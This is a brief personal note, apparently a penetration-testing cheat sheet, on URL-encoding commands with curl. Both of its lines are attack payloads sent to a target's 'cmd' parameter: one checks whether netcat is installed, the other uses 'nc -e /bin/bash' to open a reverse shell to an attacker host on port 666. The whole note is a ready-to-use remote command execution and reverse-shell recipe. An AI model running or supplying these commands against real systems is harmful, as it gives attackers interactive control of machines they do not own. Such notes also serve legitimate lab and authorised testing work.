---
title: URL Encode using curl
updated: 2025-04-29 06:57:43Z
created: 2025-04-29 06:53:49Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

Examples:
Check if **nc** is installed
`curl http://<target_url> --data-urlencode "cmd=which nc"`

Run a reverse shell to kali on 666
`curl http://target_url --data-urlencode "cmd=nc -nv <evil> 666 -e /bin/bash"`